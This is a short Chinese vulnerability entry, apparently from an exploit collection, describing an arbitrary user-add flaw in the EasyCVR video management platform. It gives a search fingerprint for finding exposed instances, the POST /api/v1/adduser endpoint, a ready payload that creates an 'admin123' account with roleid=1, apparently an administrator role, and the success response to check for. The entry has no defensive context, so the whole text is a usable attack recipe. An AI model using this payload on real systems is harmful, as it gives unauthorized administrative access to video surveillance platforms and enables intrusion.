# EasyCVR视频管理平台adduser存在任意用户添加漏洞

EasyCVR ｜ 其他 ｜ —
- **指纹**：`title="EasyCVR"`
- **请求**：`POST /api/v1/adduser HTTP/1.1`

**Payload**
```
name=admin123&username=admin123&password=e10adc3949ba59abbe56e057f20f883e&roleid=1
```
- **响应特征**：200 “status”: “success”